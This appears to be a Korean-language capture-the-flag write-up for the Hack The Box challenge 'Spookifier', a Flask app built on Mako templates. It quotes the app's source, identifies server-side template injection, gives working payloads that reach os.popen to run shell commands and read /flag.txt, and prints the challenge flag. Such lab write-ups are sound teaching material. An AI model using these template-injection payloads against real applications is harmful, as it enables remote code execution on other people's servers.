# Spookifier
![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54)
![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white)

![image](https://github.com/user-attachments/assets/a98035ef-3cf2-469b-aa8b-28a5446c1232)
- 페이지 접속시 사용자의 입력폼이 하나 존재

## Source Code Analysis
```
from flask import Flask, jsonify
from application.blueprints.routes import web
from flask_mako import MakoTemplates

app = Flask(__name__)
MakoTemplates(app)

def response(message):
    return jsonify({'message': message})

app.register_blueprint(web, url_prefix='/')

@app.errorhandler(404)
def not_found(error):
    return response('404 Not Found'), 404

@app.errorhandler(403)
def forbidden(error):
    return response('403 Forbidden'), 403

@app.errorhandler(400)
def bad_request(error):
    return response('400 Bad Request'), 400
```
- ```mako```템플릿 엔진 사용

```
def change_font(text_list):
    text_list = [*text_list]
    current_font = []
    all_fonts = []
    
    add_font_to_list = lambda text, font_type: (
        [current_font.append(globals()[font_type].get(i, ' ')) for i in text],
        all_fonts.append(''.join(current_font)),
        current_font.clear()
    ) and None
    
    add_font_to_list(text_list, 'font1')
    add_font_to_list(text_list, 'font2')
    add_font_to_list(text_list, 'font3')
    add_font_to_list(text_list, 'font4')
    
    return all_fonts

def spookify(text):
    converted_fonts = change_font(text_list=text)
    return generate_render(converted_fonts=converted_fonts)
```
- 특별한 점 없는 mako 템플릿 SSTI 문제 

## PoC
- 공격 가능 여부를 확인하고 RCE 진행
```
${''.__class__.__mro__[1].__subclasses__()} #객체가 출력되는지를 통해 ssti 여부 확인
${''.__class__.__mro__[1].__subclasses__()[280]} #RCE를 위한 Popen객체 찾기
${self.module.cache.util.os.popen('cat /flag.txt').read()} #Popen 객체로 /flag.txt 파일 읽기
```
![image](https://github.com/user-attachments/assets/f7a7fdda-d69f-4bf2-a5f2-94dce9ff9ba6)
- flag 획득 ```HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}```
